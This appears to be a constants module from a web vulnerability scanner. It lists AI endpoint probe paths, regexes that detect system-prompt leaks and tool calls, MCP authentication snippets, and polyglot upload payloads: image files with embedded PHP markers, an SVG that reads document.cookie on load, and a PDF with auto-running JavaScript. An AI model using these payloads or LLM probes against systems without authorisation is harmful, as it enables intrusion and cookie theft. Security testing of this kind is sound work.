_AI_PROBE_PATHS: List[str] = [
    "/chat", "/chat/completions", "/api/chat", "/api/completions", "/api/query",
    "/api/ai", "/api/llm", "/api/generate", "/api/v1/chat", "/api/v1/completions",
    "/api/v1/generate", "/ask", "/query", "/v1/chat/completions",
    "/api/message", "/api/messages", "/api/assistant",
]

_PI_SYSTEM_LEAK_RE = re.compile(
    r'system prompt|system message|You are|<\|system\|>|<\|im_start\|>system|'
    r'SYSTEM:|<system>|<<SYS>>|\[INST\]|your instructions|I have been instructed|'
    r'I am an AI|as an AI language model|my context window|I was trained',
    re.I
)

_PI_TOOL_CALL_RE = re.compile(
    r'"tool_calls"\s*:\s*\[|"function_call"\s*:\s*\{|"tool_use"\s*:|'
    r'"name"\s*:\s*"(?:shell|execute|run|cmd|bash|eval)"',
    re.I
)

_LLM_FINGERPRINT_RE = re.compile(
    r'"(?:model|choices|usage|finish_reason|delta|content|generated_text|output|completion|'
    r'candidates|parts|text|message|role|tokens|logprobs|index|object)"\s*:',
    re.I
)

_LLM_SYSPROMPT_RE = re.compile(
    r'You are|I am an AI|system prompt|<\|system\|>|<\|im_start\|>system|'
    r'SYSTEM:|Assistant:|Human:|<system>|<instruction>|INST\]|SYS\]|'
    r'your instructions|my instructions|I have been instructed|'
    r'I was trained|my context window|my context includes',
    re.I
)

_LLM_TOOL_CALL_RE = re.compile(
    r'"tool_calls"|"function_call"|"tool_use"|"actions":\s*\[|'
    r'"name"\s*:\s*"[a-z_]+"\s*,\s*"(?:arguments|input)"',
    re.I
)

_LLM_VENDOR_RE = re.compile(
    r'openai|claude|anthropic|gpt-|llama|mistral|gemini|palm|cohere|'
    r'huggingface|vertex|bedrock|together\.ai|replicate',
    re.I
)

_LLM_STORE_PATHS = [
    "/api/profile", "/api/user", "/api/account", "/api/settings",
    "/api/documents", "/api/files", "/api/upload", "/api/knowledge",
    "/api/notes", "/api/memories", "/api/history", "/api/feedback",
    "/api/comments", "/api/posts", "/api/search",
]

_MCP_AUTH_MIDDLEWARE_APACHE = """\
<LocationMatch "^/mcp">
    AuthType Basic
    AuthName "MCP Access"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</LocationMatch>
"""

_MCP_AUTH_EXPRESS = """\
const mcpAuth = (req, res, next) => {
  const token = req.headers['authorization'];
  if (!token || token !== 'Bearer ' + process.env.MCP_SECRET) return res.status(401).json({error:'unauthorized'});
  next();
};
app.use('/mcp', mcpAuth);
"""

_POLYGLOT_GIF_PHP = (
    b"GIF89a" + b"\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,"
    b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;" +
    b"\n<?php echo 'POLYGLOT_RCE_' . md5('polyglot') . '_'; ?>\n"
)

_POLYGLOT_JPEG_PHP = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"\xff\xfe\x00\x1c<?php echo 'POLYGLOT_RCE_' . md5('polyglot') . '_'; ?>"
    b"\xff\xd9"
)

_POLYGLOT_SVG_JS = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" onload="document.write(\'POLYGLOT_XSS_\' + btoa(document.cookie) + \'_END\')">'
    b'<rect width="100" height="100" fill="red"/></svg>'
)

_POLYGLOT_PNG_PHP = (
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
    b"\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00"
    b"\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82"
    b"<?php echo 'POLYGLOT_RCE_' . md5('polyglot') . '_'; ?>"
)

_POLYGLOT_PDF_JS = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction<</Type/Action/S/JavaScript"
    b"/JS(app.alert('POLYGLOT_XSS_' + this.path))>>>>endobj\n"
    b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
    b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 3 3]>>endobj\n"
    b"xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n"
    b"trailer<</Size 4/Root 1 0 R>>\nstartxref\n%%EOF"
)

_HPB_JS_REQ_KEY_RE = re.compile(
    r'(?:params|req\.(?:query|body|params)|request\.(?:GET|POST))'
    r'\[["\']([A-Za-z_][\w]{0,49})["\']',
    re.I,
)

_SHADOW_PRIVILEGE_INDICATORS = [
    "admin", "debug", "internal", "staging", "canary", "beta",
    "preview", "feature", "secret", "token", "password", "key",
    "disabled", "hidden", "flag", "rollout", "dark", "experiment",
    "rbac", "role", "permission", "sudo", "elevated",
]

__all__ = [
    "_TERMINAL_ARTIFACTS",
    "_INTERMEDIATE_ARTIFACTS",
    "_JS_LIB_URL_PATTERNS",
    "_JS_LIB_SOURCE_PATTERNS",
    "_DB_FINGERPRINTS",
    "_TIME_PAYLOADS",
    "_LFI_CONFIRM_RE",
    "_OPEN_REDIRECT_PARAMS",
    "_SECURITY_HEADERS",
    "_LDAP_ERRORS",
    "_LDAP_PAYLOADS",
    "_SSRF_PAYLOADS",
    "_SECRET_PATTERNS",
    "_PROTO_PAYLOADS",
    "_OPENAPI_JSON_PATHS",
    "_S3_PATTERN",
    "_HTML_COMMENT_SENSITIVE",
    "_DESER_RESPONSES",
    "_LOGIN_PATHS",
    "_STRONG_FINDING_RE",
    "_WEAK_FINDING_RE",
    "_LOW_CONFIDENCE_MODULE_RE",
    "_EXACT_EVIDENCE_RE",
    "_PROOF_PAIR_RE",
    "_BCM_VALUE_CLASSES",
    "_AM_POS_RE",
    "_CSP_SEC_PARAMS",
    "_AIF_NONCE_RE",
    "_DAGE_ID_FIELD_RE",
    "_DAGE_HREF_RE",
    "_DAGE_NONCE_RE",
    "_DAGE_SENSITIVE_RTYPES",
    "_RACE_KEYWORD_RE",
    "_RACE_VALUE_RE",
    "_RACE_ERROR_RE",
    "_RACE_FORM_ACTION_RE",
    "_SSTI_SYNTAXES",
    "_SSTI_BLIND_TIMING",
    "_SSTI_ERR_EXFIL",
    "_SSTI_J2_SUBCLASS_TARGETS",
    "_SSTI_WAF_BYPASS",
    "_SSTI_SECRET_CMD",
    "_SSTI_EXFIL_FILES",
    "_SSTI_PIVOT_PROBES",
    "_SSTI_COMMON_PARAMS",
    "_SSTI_BYPASS_FMTS",
    "_CP_CACHE_HEADERS",
    "_GQL_PATHS",
    "_GQL_INTROSPECT_Q",
    "_GQL_SENSITIVE_MUTATIONS",
    "_GQL_SENSITIVE_QUERIES",
    "_GQL_BF_PASSES",
    "_XXE_PATHS",
    "_XXE_CLASSIC_PL",
    "_XXE_WIN_PL",
    "_XXE_HOSTNAME_PL",
    "_XXE_SSRF_PL",
    "_XXE_XINCLUDE_PL",
    "_XXE_SVG_PL",
    "_XXE_LOL_PL",
    "_XXE_SOAP_WRAP",
    "_PP_JSON_PROBES",
    "_TOK_JWT_WEAK_SECRETS",
    "_LING_PRIV_CLUSTERS",
    "_XSS_EXEC_PROBES",
    "_XSS_DEFAULT_PARAMS",
    "_NOSQL_JSON_PAYLOADS",
    "_NOSQL_URL_BYPASS",
    "_MIXED_CONTENT_PATTERNS",
    "_JWT_COMMON_SECRETS",
    "_POLYGLOT_PAYLOAD",
    "_JS_PASSTHROUGH_FNS",
    "_JS_POSTMSG_LISTENER_RE",
    "_JS_FN_DEF_RE",
    "_JS_ARRAY_METHOD_RE",
    "_JS_IMPORT_RE",
    "_JS_EXPORT_RE",
    "_AI_PROBE_PATHS",
    "_PI_SYSTEM_LEAK_RE",
    "_PI_TOOL_CALL_RE",
    "_LLM_FINGERPRINT_RE",
    "_LLM_SYSPROMPT_RE",
    "_LLM_TOOL_CALL_RE",
    "_LLM_VENDOR_RE",
    "_LLM_STORE_PATHS",
    "_MCP_AUTH_MIDDLEWARE_APACHE",
    "_MCP_AUTH_EXPRESS",
    "_POLYGLOT_GIF_PHP",
    "_POLYGLOT_JPEG_PHP",
    "_POLYGLOT_SVG_JS",
    "_POLYGLOT_PNG_PHP",
    "_POLYGLOT_PDF_JS",
    "_SHADOW_PRIVILEGE_INDICATORS",
    "_HPB_JS_REQ_KEY_RE",
]
